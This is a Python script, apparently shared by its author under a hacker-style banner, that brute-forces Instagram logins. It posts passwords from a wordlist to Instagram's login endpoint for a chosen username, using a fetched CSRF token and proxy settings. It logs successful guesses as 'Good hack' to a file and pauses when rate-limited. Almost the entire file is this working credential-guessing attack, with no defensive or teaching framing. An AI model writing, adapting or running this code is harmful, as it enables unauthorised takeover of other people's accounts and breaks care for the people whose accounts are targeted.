import os
import sys
import json
from time import sleep
from datetime import datetime
import requests

normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"

def Logo():
    print(detect_color+'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (insTof by 8.3v)        $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
==============================================
[developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
[developer_snapchat] => flaah999
==============================================
          
''')

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def attempt_login(session, username, password, csrf_token):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    time = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf_token
    }
    return session.post(login_url, data=payload, headers=headers)

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print("Password file not found.")
        sys.exit(1)

def get_csrf_token(session):
    link = 'https://www.instagram.com/accounts/login/'
    req = session.get(link)
    return req.cookies.get('csrftoken', None)

def main():
    clear_console()
    print('')
    Logo()
    username = input(end_banner_color + "Username => ")
    passwords_file = input("List of Passwords => ")
    passwords = read_passwords(passwords_file)
    
    proxies = [
        'http://proxy1.example.com:port',
        'http://proxy2.example.com:port',
        # Add more proxies if needed
    ]
    
    with requests.Session() as session:
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print("CSRFTOKEN not found in cookies")
            return
        for password in passwords:
            proxy = {'http': proxies[0]}  # Use the first proxy from the list
            session.proxies = proxy
            response = attempt_login(session, username, password, csrf_token)
            if 'checkpoint_url' in response.text:
                print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
                with open('good.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
                break 				
            if 'userId' in response.text:
                print ((red_color + ' --> Username : ' + green_color + username + red_color +' --> Password : '+ green_color + password + ' --> Good hack'))
                with open('good.txt', 'a') as x:
                    x.write(username + ':' + password + '\n')
            if 'error' in response.text:
                print((normal_color+'' + ' --> Username : ' + end_banner_color + username + red_color + ' --> Password : ' + end_banner_color + password + red_color + ' --> Sorry, there was a problem'))
            elif 'status' in response.text:
                print (end_banner_color + "---------------------------------------")
                print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
                print('\nSleeping for 10 seconds...')
                sleep(10)

if __name__ == "__main__":
    main()
